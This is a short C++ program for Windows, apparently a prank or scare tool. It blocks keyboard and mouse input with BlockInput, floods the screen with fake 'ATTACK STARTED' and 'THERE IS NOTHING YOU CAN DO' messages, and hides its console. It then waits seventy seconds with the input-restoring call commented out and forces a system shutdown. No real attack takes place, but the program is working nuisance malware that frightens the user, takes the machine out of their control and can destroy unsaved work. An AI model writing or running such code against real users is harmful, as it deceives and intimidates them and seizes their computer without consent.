#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <winable.h>
#include <stdlib.h>


int main()
{
    std::cout << "<<Start\n";
    BlockInput(true);
    std::cout <<"DOS INTIALIZING\n";
    std::cout <<"INTIALIZATION SUCCESSFUL\n";
    Sleep(2000);
    for(int i=0; i<100; i++)
    {
        Sleep(50);
        std::cout <<"ATTACK \tATTACK STARTED\tATTACK STARTED\tATTACK STARTED\tATTACK STARTED\tATTACK STARTED\tATTACK STARTED\n";
    }

    for(int i=0; i<100; i++)
    {
        Sleep(50);
        std::cout <<"THERE IS NOTHING YOU CAN DO\tTHERE IS NOTHING YOU CAN DO\tTHERE IS NOTHING YOU CAN DO\tTHERE IS NOTHING YOU CAN DO\t\n";
    }


    FreeConsole();



    Sleep(70000);
    //BlockInput(false);
    system("C:\\Windows\\System32\\shutdown /s");


    std::cout << "<<Done";


}

